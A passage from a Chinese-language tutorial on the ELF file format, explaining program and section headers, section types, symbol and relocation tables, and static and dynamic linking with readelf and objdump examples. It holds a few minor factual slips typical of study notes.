NUMber）。因此， e_shnum 与 e_shentsize 的乘积即为节头表的字节长度。如果文件中没有节头表，则该项值为 0。 # e_shstrndx 这一项给出节头表中与节名字符串表相关的表项的索引值（Section Header table InDeX related with section name STRing table）, 即 section table 中的第 e_shstrndx 项元素，保存了所有 section table 名称的字符串信息。如果文件中没有节名字符串表，则该项值为 SHN_UNDEF # Program Header Program Header Table 是一个结构体数组，每一个元素的类型是 Elf32_Phdr ，描述了一个段或者其它系统在准备程序执行时所需要的信息。其中，ELF 头中的 e_phentsize 和 e_phnum 指定了该数组每个元素的大小以及元素个数。一个目标文件的段包含一个或者多个节。程序的头部只有对于可执行文件和共享目标文件有意义。 可以说，Program Header Table 就是专门为 ELF 文件运行时中的段所准备的。 Elf32_Phdr 的数据结构如下 typedef struct&#123; Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment */&#125; Elf32_Phdr;每个字段的说明如下 字段 说明 p_type 该字段为段的类型，或者表明了该结构的相关信息。 p_offset 该字段给出了从文件开始到该段开头的第一个字节的偏移。 p_vaddr 该字段给出了该段第一个字节在内存中的虚拟地址。 p_paddr 该字段仅用于物理地址寻址相关的系统中， 由于 “System V” 忽略了应用程序的物理寻址，可执行文件和共享目标文件的该项内容并未被限定。 p_filesz 该字段给出了文件镜像中该段的大小，可能为 0。 p_memsz 该字段给出了内存镜像中该段的大小，可能为 0。 p_flags 该字段给出了与段相关的标记。 p_align 可加载的程序的段的 p_vaddr 以及 p_offset 的大小必须是 page 的整数倍。该成员给出了段在文件以及内存中的对齐方式。如果该值为 0 或 1 的话，表示不需要对齐。除此之外，p_align 应该是 2 的整数指数次方，并且 p_vaddr 与 p_offset 在模 p_align 的意义下，应该相等。 # p_type 可执行文件中的段类型如下 名字 取值 说明 PT_NULL 0 表明段未使用，其结构中其他成员都是未定义的。 PT_LOAD 1 此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余” 的字节都要被置为 0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。 PT_DYNAMIC 2 此类型段给出动态链接信息。 PT_INTERP 3 此类型段给出了一个以 NULL 结尾的字符串的位置和长度，该字符串将被当作解释器调用。这种段类型仅对可执行文件有意义（也可能出现在共享目标文件中）。此外，这种段在一个文件中最多出现一次。而且这种类型的段存在的话，它必须在所有可加载段项的前面。 PT_NOTE 4 此类型段给出附加信息的位置和大小。 PT_SHLIB 5 该段类型被保留，不过语义未指定。而且，包含这种类型的段的程序不符合 ABI 标准。 PT_PHDR 6 该段类型的数组元素如果存在的话，则给出了程序头部表自身的大小和位置，既包括在文件中也包括在内存中的信息。此类型的段在文件中最多出现一次。此外，只有程序头部表是程序的内存映像的一部分时，它才会出现。如果此类型段存在，则必须在所有可加载段项目的前面。 PT_LOPROC~PT_HIPROC 0x70000000 ~0x7fffffff 此范围的类型保留给处理器专用语义。 # p_flags 被系统加载到内存中的程序至少有一个可加载的段。当系统为可加载的段创建内存镜像时，它会按照 p_flags 将段设置为对应的权限。可能的段权限位有 其中，所有在 PF_MASKPROC 中的比特位都是被保留用于与处理器相关的语义信息。 如果一个权限位被设置为 0，这种类型的段是不可访问的。实际的内存权限取决于相应的内存管理单元，不同的系统可能操作方式不一样。尽管所有的权限组合都是可以的，但是系统一般会授予比请求更多的权限。在任何情况下，除非明确说明，一个段不会有写权限。下面给出了所有的可能组合。 例如，一般来说，.text 段一般具有读和执行权限，但是不会有写权限。数据段一般具有写，读，以及执行权限。 # Section Header ELF 头中的 e_shoff 项给出了从文件开头到节头表位置的字节偏移。 e_shnum 告诉了我们节头表包含的项数； e_shentsize 给出了每一项的字节大小。 节头表是一个数组，每个数组的元素的类型是 ELF32_Shdr ，每一个元素都描述了一个节区的概要内容。每个节区头部可以用下面的数据结构进行描述： typedef struct&#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */&#125; Elf32_Shdr;每个字段的含义如下 成员 说明 sh_name 节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。 sh_type 根据节的内容和语义进行分类，具体的类型下面会介绍。 sh_flags 每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。 sh_addr 如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。 sh_offset 给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset 成员给出的是概念性的偏移。 sh_size 此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为 SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。 sh_link 此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。 sh_info 此成员给出附加信息，其解释依赖于节区类型。 sh_addralign 某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说， sh_addr%sh_addralign=0 。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。 sh_entsize 某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为 0。 # sh_type 节类型目前有下列可选范围，其中 SHT 是 Section Header Table 的简写。 名称 取值 说明 SHT_NULL 0 该类型节区是非活动的，这种类型的节头中的其它成员取值无意义。 SHT_PROGBITS 1 该类型节区包含程序定义的信息，它的格式和含义都由程序来决定。 SHT_SYMTAB 2 该类型节区包含一个符号表（SYMbol TABle）。目前目标文件对每种类型的节区都只 能包含一个，不过这个限制将来可能发生变化。 一般，SHT_SYMTAB 节区提供用于链接编辑（指 ld 而言） 的符号，尽管也可用来实现动态链接。 SHT_STRTAB 3 该类型节区包含字符串表（ STRing TABle ）。 SHT_RELA 4 该类型节区包含显式指定位数的重定位项（ RELocation entry with Addends ），例如，32 位目标文件中的 Elf32_Rela 类型。此外，目标文件可能拥有多个重定位节区。 SHT_HASH 5 该类型节区包含符号哈希表（ HASH table ）。 SHT_DYNAMIC 6 该类型节区包含动态链接的信息（ DYNAMIC linking ）。 SHT_NOTE 7 该类型节区包含以某种方式标记文件的信息（NOTE）。 SHT_NOBITS 8 该类型节区不占用文件的空间，其它方面和 SHT_PROGBITS 相似。尽管该类型节区不包含任何字节，其对应的节头成员 sh_offset 中还是会包含概念性的文件偏移。 SHT_REL 9 该类型节区包含重定位表项（RELocation entry without Addends），不过并没有指定位数。例如，32 位目标文件中的 Elf32_rel 类型。目标文件中可以拥有多个重定位节区。 SHT_SHLIB 10 该类型此节区被保留，不过其语义尚未被定义。 SHT_DYNSYM 11 作为一个完整的符号表，它可能包含很多对动态链接而言不必 要的符号。因此，目标文件也可以包含一个 SHT_DYNSYM 节区，其中保存动态链接符号的一个最小集合，以节省空间。 SHT_LOPROC 0X70000000 此值指定保留给处理器专用语义的下界（ LOw PROCessor-specific semantics ）。 SHT_HIPROC OX7FFFFFFF 此值指定保留给处理器专用语义的上界（ HIgh PROCessor-specific semantics ）。 SHT_LOUSER 0X80000000 此值指定保留给应用程序的索引下界。 SHT_HIUSER 0X8FFFFFFF 此值指定保留给应用程序的索引上界。 # sh_flags 节头中 sh_flags 字段的每一个比特位都可以给出其相应的标记信息，其定义了对应的节区的内容是否可以被修改、被执行等信息。如果一个标志位被设置，则该位取值为 1，未定义的位都为 0。目前已定义值如下，其他值保留。 名称 值 说明 SHF_WRITE 0x1 这种节包含了进程运行过程中可以被写的数据。 SHF_ALLOC 0x2 这种节在进程运行时占用内存。对于不占用目标文件的内存镜像空间的某些控制节，该属性处于关闭状态 (off)。 SHF_EXECINSTR 0x4 这种节包含可执行的机器指令（EXECutable INSTRuction）。 SHF_MASKPROC 0xf0000000 所有在这个掩码中的比特位用于特定处理器语义。 # sh_link &amp; sh_info 当节区类型的不同的时候，sh_link 和 sh_info 也会具有不同的含义。 sh_type sh_link sh_info SHT_DYNAMIC 节区中使用的字符串表的节头索引 0 SHT_HASH 此哈希表所使用的符号表的节头索引 0 SHT_REL/SHT_RELA 与符号表相关的节头索引 重定位应用到的节的节头索引 SHT_SYMTAB/SHT_DYNSYM 操作系统特定信息，Linux 中的 ELF 文件中该项指向符号表中符号所对应的字符串节区在 Section Header Table 中的偏移。 操作系统特定信息 other SHN_UNDEF 0 # ELF sections # 节的分类 # .text 节 .text 节是保存了程序代码指令的代码节。一段可执行程序，如果存在 Phdr，则 .text 节就会存在于 text 段中。由于 .text 节保存了程序代码，所以节类型为 SHT_PROGBITS 。 # .rodata 节 rodata 节保存了只读的数据，如一行 C 语言代码中的字符串。由于 .rodata 节是只读的，所以只能存在于一个可执行文件的只读段中。因此，只能在 text 段（不是 data 段）中找到 .rodata 节。由于 .rodata 节是只读的，所以节类型为 SHT_PROGBITS 。 # .plt 节（过程链接表） .plt 节也称为过程链接表（Procedure Linkage Table），其包含了动态链接器调用从共享库导入的函数所必需的相关代码。由于 .plt 节保存了代码，所以节类型为 SHT_PROGBITS 。 # .data 节 .data 节存在于 data 段中，其保存了初始化的全局变量等数据。由于 .data 节保存了程序的变量数据，所以节类型为 SHT_PROGBITS 。 # .bss 节 .bss 节存在于 data 段中，占用空间不超过 4 字节，仅表示这个节本省的空间。 .bss 节保存了未进行初始化的全局数据。程序加载时数据被初始化为 0，在程序执行期间可以进行赋值。由于 .bss 节未保存实际的数据，所以节类型为 SHT_NOBITS 。 # .got.plt 节（全局偏移表 - 过程链接表） .got 节保存了全局偏移表。 .got 节和 .plt 节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。由于 .got.plt 节与程序执行有关，所以节类型为 SHT_PROGBITS 。 # .dynsym 节（动态链接符号表） .dynsym 节保存在 text 段中。其保存了从共享库导入的动态符号表。节类型为 SHT_DYNSYM 。 # .dynstr 节（动态链接字符串表） .dynstr 保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。 # .rel.* 节（重定位表） 重定位表保存了重定位相关的信息，这些信息描述了如何在链接或运行时，对 ELF 目标文件的某部分或者进程镜像进行补充或修改。由于重定位表保存了重定位相关的数据，所以节类型为 SHT_REL 。 # .hash 节 .hash 节也称为 .gnu.hash ，其保存了一个用于查找符号的散列表。 # .symtab 节（符号表） .symtab 节是一个 ElfN_Sym 的数组，保存了符号信息。节类型为 SHT_SYMTAB 。 # .strtab 节（字符串表） .strtab 节保存的是符号字符串表，表中的内容会被 .symtab 的 ElfN_Sym 结构中的 st_name 引用。节类型为 SHT_STRTAB 。 # .ctors 节和.dtors 节 .ctors （构造器）节和 .dtors （析构器）节分别保存了指向构造函数和析构函数的函数指针，构造函数是在 main 函数执行之前需要执行的代码；析构函数是在 main 函数之后需要执行的代码。 # 符号表 符号是对某些类型的数据或代码（如全局变量或函数）的符号引用，函数名或变量名就是符号名。例如， printf() 函数会在动态链接符号表 .dynsym 中存有一个指向该函数的符号项（以 Elf_Sym 数据结构表示）。在大多数共享库和动态链接可执行文件中，存在两个符号表。即 .dynsym 和 .symtab 。 .dynsym 保存了引用来自外部文件符号的全局符号。如 printf 库函数。 .dynsym 保存的符号是 .symtab 所保存符合的子集， .symtab 中还保存了可执行文件的本地符号。如全局变量，代码中定义的本地函数等。 既然 .dynsym 是 .symtab 的子集，那为何要同时存在两个符号表呢？ 通过 readelf -S 命令可以查看可执行文件的输出，一部分节标志位（ sh_flags ）被标记为了 A（ALLOC）、WA（WRITE/ALLOC）、AX（ALLOC/EXEC）。其中， .dynsym 被标记为 ALLOC，而 .symtab 则没有标记。 ALLOC 表示有该标记的节会在运行时分配并装载进入内存，而 .symtab 不是在运行时必需的，因此不会被装载到内存中。 .dynsym 保存的符号只能在运行时被解析，因此是运行时动态链接器所需的唯一符号。 .dynsym 对于动态链接可执行文件的执行是必需的，而 .symtab 只是用来进行调试和链接的。 上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个 Elf_Sym 结构，对应可以在字符串表中索引得到一个字符串。该数据结构中成员的含义如下表所示： 成员 含义 st_name 符号名。该值为该符号名在字符串表中的偏移地址。 st_value 符号对应的值。存放符号的值（可能是地址或位置偏移量）。 st_size 符号的大小。 st_other 0 st_shndx 符号所在的节 st_info 符号类型及绑定属性 使用 readelf 工具我们也能够看到符号表的相关信息。 $ readelf -s hello.o Symbol table '.symtab' contains 11 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS hello.c 2: 0000000000000000 0 SECTION LOCAL DEFAULT 1 3: 0000000000000000 0 SECTION LOCAL DEFAULT 3 4: 0000000000000000 0 SECTION LOCAL DEFAULT 4 5: 0000000000000000 0 SECTION LOCAL DEFAULT 5 6: 0000000000000000 0 SECTION LOCAL DEFAULT 7 7: 0000000000000000 0 SECTION LOCAL DEFAULT 8 8: 0000000000000000 0 SECTION LOCAL DEFAULT 6 9: 0000000000000000 21 FUNC GLOBAL DEFAULT 1 main 10: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND puts # 字符串表 类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即 .dynstr 和 .strtab ，分别对应于 .dynsym 和 symtab 。此外，还有一个 .shstrtab 的节头字符串表，用于保存节头表中用到的字符串，可通过 sh_name 进行索引。 ELF 文件中所有字符表的结构基本一致，如上图所示。 # 重定位表 重定位就是将符号定义和符号引用进行连接的过程。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。 重定位表是进行重定位的重要依据。我们可以使用 objdump 工具查看目标文件的重定位表： $ objdump -r hello.o hello.o: file format elf64-x86-64 RELOCATION RECORDS FOR [.text]: OFFSET TYPE VALUE 0000000000000005 R_X86_64_32 .rodata 000000000000000a R_X86_64_PC32 puts-0x0000000000000004 RELOCATION RECORDS FOR [.eh_frame]: OFFSET TYPE VALUE 0000000000000020 R_X86_64_PC32 .text 重定位表是一个 Elf_Rel 类型的数组结构，每一项对应一个需要进行重定位的项。 其成员含义如下表所示： 成员 含义 r_offset 重定位入口的偏移。对于可重定位文件来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移；对于可执行文件或共享对象文件来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址 r_info 重定位入口的类型和符号。因为不同处理器的指令系统不一样，所以重定位所要修正的指令地址格式也不一样。每种处理器都有自己的一套重定位入口的类型。对于可执行文件和共享目标文件来说，它们的重定位入口是动态链接类型的。 重定位是目标文件链接成为可执行文件的关键。 # ELF 的链接过程 此处的内容来源于计算机那些事 (5)—— 链接、静态链接、动态链接，仅作学习记录和备份用 # 链接概述 模块化设计是软件开发中最常用的设计思想。链接（Linking） 本质上就是把各个模块之间相互引用的部分处理好，使得各个模块之间能够正确衔接。比如： 我们在模块 main.c 中使用另一个模块 func.c 中的 foo() 函数。我们在 main.c 模块中每一处调用 foo 时都必须确切知道 foo 函数的地址。但由于每个模块都是单独编译的。编译器在编译 main.c 的时候并不知道 foo 函数的地址。所以编译器会暂时把这些调用 foo 的指令的目标地址搁置，等待最后链接时由链接器将这些指令的目标地址修正。这就是静态链接最基本的过程和作用。 如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如 .c ）文件经过编译器编译成目标文件（Object File，一般扩展名为 .o 或 .obj ）。目标文件和 库（Library） 一起链接形成最终的可执行文件。 其中，最常见的库就是运行时库（Runtime Library），它是支持程序运行的基本函数的集合。库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成。 链接过程主要包含了三个步骤： 地址与空间分配（Address and Storage Allocation） 符号解析（Symbol Resolution） 重定位（Relocation） 下面，我们以两个源代码文件 a.c 和 b.c 为例展开分析。 // a.c extern int shared; int main() &#123; int a = 100; swap(&amp;a, &amp;shared); &#125; // b.c int shared = 1; void swap(int *a, int *b) &#123; *a ^= *b ^= *a ^= *b; &#125; 其中， b.c 中定义了两个全局符号：变量 shared 、函数 swap ； a.c 中定义了一个全局符号： main 。 a.c 引用了 b.c 中的 swap 和 shared 。接下来我们要将两个目标文件链接在一起并最终形成一个执行程文件 ab 。 使用 gcc -c 命令我们可以分别编译得到 a.o 和 b.o 两个目标文件。 # 地址与空间分配 在介绍 ELF 文件结构关于段与节的区别时，我们就提到过可执行文件中的段是由目标文件中的节合并而来的。那么，我们的第一个问题是：对于多个输入目标文件，链接器如何将它们的各个节合并到输出文件呢？或者说，输出文件中的空间如何分配给输入文件。 # 按序叠加 一个最简单的方案就是将输入的文件按序叠加，如下图所示。 虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86 硬件的对齐要求是 4KB。如果一个节的大小只有 1 个字节，它也要在内存在重用 4KB。这样会造成大量内部碎片。所以不是一个好的方案。 # 合并相似节 一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 .text 节合并到输出文件的 text 段（注意，此时出现了段和节两个概念），如下图所示。 其中 .bss 节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的空间和地址有两层含义: 在输出的可执行文件中的空间 在装载后的虚拟地址中的空间 对于有实际数据的节，如 .text 和 .data ，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于 .bss 来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。我们在这里谈到的空间分配只关注于虚拟地址空间的分配，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。 现在的链接器空间分配的策略基本上都采用 “合并相似节” 的方法，使用这种方法的链接器一般采用一种叫 两步链接（Two-pass Linking） 的方法。即整个链接过程分为两步： 第一步 地址与空间分配 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。 第二步 符号解析与重定位 使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。事实上，第二步是链接过程的核心，尤其是重定位。 在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 ELF 文件结构一文中没有介绍的 程序头表（Program Header Table） 结构。如下右图可执行文件结构所示，主要生成两个段：代码段（ text 段）、数据段（ data 段 ）。 我们使用 ld 或 gcc 将 a.o 和 b.o 链接起来，然后使用 objdump 工具来查看链接前后的地址分配情况。 $ objdump -h a.o Sections: Idx Name Size VMA LMA File off Algn 0 .text 0000004f 0000000000000000 0000000000000000 00000040 2**0 CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE 1 .data 00000000 0000000000000000 0000000000000000 0000008f 2**0 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000000 0000000000000000 0000000000000000 0000008f 2**0 ALLOC ... $ objdump -h b.o Sections: Idx Name Size VMA LMA File off Algn 0 .text 0000004b 0000000000000000 0000000000000000 00000040 2**0 CONTENTS, ALLOC, LOAD, READONLY, CODE 1 .data 00000004 0000000000000000 0000000000000000 0000008c 2**2 CONTENTS, ALLOC, LOAD, DATA 2 .bss 00000000 0000000000000000 0000000000000000 00000090 2**0 ALLOC ... $ objdump -h ab Sections: Idx Name Size VMA LMA File off Algn ... 13 .text 00000202 0000000000400450 0000000000400450 00000450 2**4 CONTENTS, ALLOC, LOAD, READONLY, CODE ... 24 .data 00000014 0000000000601028 0000000000601028 00001028 2**3 CONTENTS, ALLOC, LOAD, DATA 25 .bss 00000004 000000000060103c 000000000060103c 0000103c 2**0 ALLOC ... 可以发现，链接前目标文件中所有节的 VMA（Virtual Memory Address） 都是 0，因为虚拟空间还没有分配。链接后，可执行文件 ab 中各个节被分配到了相应的虚拟地址，如 .text 节被分配到了地址 0x0000000000400450 。 那么，为什么链接器要将可执行文件 ab 的 .text 节分配到 0x0000000000400450 ？而不是从虚拟空间的 0 地址开始分配呢？这涉及到操作系统的进程虚拟地址空间的分配规则。在 Linux x86-64 系统中，代码段总是从 0x0000000000400000 开始的，另外 .text 节之前还有 ELF Header 、 Program Header Table 、 .init 等占用了一定的空间，所以就被分配到了 0x0000000000400450 。 # 符号解析 在两步链接中，这一步和重定位被合并成了一步，这是因为重定位的过程是伴随着符号解析的。这里我们分开介绍。 链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。 然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。 另一方面，对全局符号的解析，经常会面临多个目标文件可能会定义相同名字的全局符号。这种情况下，链接器必须要么标志一个错误，要么以某种方法选出一个定义并抛弃其他定义。 # 多重定义的全局符号解析 链接器的输入是一组可重定位目标模块。每个模块定义一组符号，有些是局部符号（只对定义该符号的模块可见），有些是全局符号（对其他模块也可见）。如果多个模块定义同名的全局符号，该如何进行取舍？ Linux 编译系统采用如下的方法解决多重定义的全局符号解析： 在编译时，编译器想汇编器输出每个全局符号，或者是强（strong）或者是弱（weak），而汇编器把这个信息隐含地编码在可重定位目标文件的符号表中。 根据强弱符号的定义，Linux 链接器使用下面的规则来处理多重定义的符号名： 规则 1：不允许有多个同名的强符号。 规则 2：如果有一个强符号和多个弱符号同名，则选择强符号。 规则 3：如果有多个弱符号同名，则从这些弱符号中任意选择一个。 另一方面，由于允许一个符号定义在多个文件中，所以可能会导致一个问题：如果一个弱符号定义在多个目标文件中，而它们的类型不同，怎么办？这种情况主要有三种： 情况 1：两个或两个以上的强符号类型不一致。 情况 2：有一个强符号，其他都是弱符号，出现类型不一致。 情况 3：两个或两个以上弱符号类型不一致。 其中，情况 1 由于多个强符号定义本身就是非法的，所以链接器就会报错。对于后两种情况，编译器和链接器采用一种叫 COMMON 块（Common Block ） 的机制来处理。其过程如下： 首先，编译器将未初始化的全局变量定义为弱符号处理。对于情况 3，最终链接时选择最大的类型。对于情况 2，最终输出结果中的符号所占空间与强符号相同，如果链接过程中有弱符号大于强符号，链接器会发出警告。 # 重定位 事实上，重定位过程也伴随着符号的解析过程。链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。 那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的 ELF 文件中的 重定位表（Relocation Table） 专门用来保存这些与重定位相关的信息。 对于可重定位的 ELF 文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的 ELF 节都有一个对应的重定位表。如果 .text 节需要被重定位，则会有一个相对应叫 .rel.text 的节保存了代码节的重定位表；如果 .data 节需要被重定位，则会有一个相对应的 .rel.tdata 的节保存了数据节的重定位表。 我们可以使用 objdump 工具来查看目标文件中的重定位表： $ objdump -r a.o a.o: file format elf64-x86-64 RELOCATION RECORDS FOR [.text]: OFFSET TYPE VALUE 0000000000000023 R_X86_64_32 share 0000000000000030 R_X86_64_PC32 swap-0x0000000000000004 0000000000000049 R_X86_64_PC32 __stack_chk_fail-0x0000000000000004 RELOCATION RECORDS FOR [.eh_frame]: OFFSET TYPE VALUE 0000000000000020 R_X86_64_PC32 .text 我们可以看到每个要被重定位的地方是一个 重定位入口（Relocation Entry）。利用数据结构成员包含的信息，即可完成重定位。 # 静态链接 事实上，静态链接的过程就是上文所描述的过程。在 Linux 中，静态链接器（static linker） ld 以一组可重定位目标文件和命令行参数作为输入，生成一个完全链接的、可以加载和运行的可执行目标文件作为输出。输入的可重定位目标文件由各种不同的节组成，每一节都是一个连续的字节序列。 # 动态链接 静态链接使得进行模块化开发，大大提供了程序的开发效率。随着，程序规模的扩大，静态链接的诸多缺点也逐渐暴露出来，如：浪费内存和磁盘空间、模块更新困难等。在静态链接中，C 语言静态库是很典型的浪费空间的例子。关于模块更新，静态链接的程序有任何更新，都必须重新编译链接，用户则需要重新下载安装该程序。 解决空间浪费和更新困难最简单的方法便是将程序的模块相互分割开来，形成独立文件。简而言之，就是不对那些组成程序的目标文件进行链接，而是等到程序要运行时才进行链接。 # 动态链接的基本实现 动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。 目前，主流操作系统都支持动态链接。在 Linux 中，ELF 动态链接文件被称为 动态共享对象（DSO，Dynamic Shared Objects），一般以 .so 为后缀；在 Windows 中，动态链接文件被称为 动态链接库（Dynamic Linking Library），一般以 .dll 为后缀。 在 Linux 中，常用的 C 语言库的运行库 glibc，其动态链接形式的版本保留在 /lib 目录下，文件名为 libc.so 。整个系统只保留一份 C 语言动态链接文件 libc.so ，所有的 C 语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的动态链接器会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。 # 动态链接程序运行时地址空间分布 对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。 关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是： 静态共享库（Static Shared Library）（地址固定） 动态共享库（Dynamic Shared Libary）（地址不固定） # 静态共享库 静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在某个特定的地址划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为静态。 但是静态共享库的目标地址会导致地址冲突、升级等问题。 # 动态共享库 采用动态共享库的方式，也称为装载时重定位（Load Time Relocation）。其基本思路是：在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。 但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。 虽然，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为地址无关代码的技术被提出以克服这个问题。 # 地址无关代码 计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决。 地址无关代码（PIC，Position-independent Code） 技术完美阐释了上面这句名言，其基本原理是：把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。 共享对象模块中的地址引用按照是否为跨模块分为两类：模块内部引用、模块外部引用。按照不用的引用方式又可分为：指令引用、数据引用。以如下代码为例，可得出如下四种类型： 类型 1：模块内部的函数调用。 类型 2：模块内部的数据访问，如模块中定义的全局变量、静态变量。 类型 3：模块外部的函数调用。 类型 4：模块外部的数据访问，如其他模块中定义的全局变量。 static int a; extern int b; extern void ext(); void bar() &#123; a = 1; // 类型2：模块内部数据访问 b = 2; // 类型4：模块外部数据访问 &#125; void foo() &#123; bar(); // 类型1：模块内部函数调用 ext(); // 类型4：模块外部函数调用 &#125; # 类型 1 模块内部函数调用 由于被调用的函数与调用者都处于同一模块，它们之间的相对位置是固定的。对于现代的系统来说，模块内部的调用都可以是相对地址调用，或者是基于寄存器的相对调用，所以对于这种指令是不需要重定位的。 # 类型 2 模块内部数据访问 一个模块前面一般是若干个页的代码，后面紧跟着若干个页的数据，这些页之间的相对位置是固定的，即任何一条指令与它需要访问的模块内部数据之间的相对位置是固定的，所以只需要相对于当前指令加上固定的偏移量就可以访问模块内部数据了。 # 类型 3 模块间数据访问 模块间的数据访问比模块内部稍微麻烦一些，因为模块间的数据访问目标地址要等到装载时才决定。此时，动态链接需要使用代码无关地址技术，其基本思想是把地址相关的部分放到数据段。ELF 的实现方法是：在数据段中建立一个指向这些变量的指针数组，也称为全局偏移表（Global Offset Table，GOT），当代码需要引用该全局变量时，可以通过 GOT 中相对应的项间接引用。过程示意图如下所示： 当指令中需要访问变量 b 时，程序会先找到 GOT，然后根据 GOT 中变量所对应的项找到变量的目标地址。每个变量都对应一个 4 字节的地址，链接器在装载模块时会查找每个变量所在的地址，然后填充 GOT 中的各个项，以确保每个指针所指向的地址正确。由于 GOT 本身是放在数据段的，所以它可以在模块装载时被修改，并且每个进程都可以有独立的副本，相互不受影响。 # 类型 4 模块间函数调用 对于模块间函数调用，同样可以采用类型 3 的方法来解决。与上面的类型有所不同的是，GOT 中响应的项保存的是目标函数的地址，当模块需要调用目标函数时，可以通过 GOT 中的项进行间接跳转。 # ELF 的装载过程 此处的内容来源于计算机那些事 (6)—— 可执行文件的装载与运行，仅作学习记录和备份用 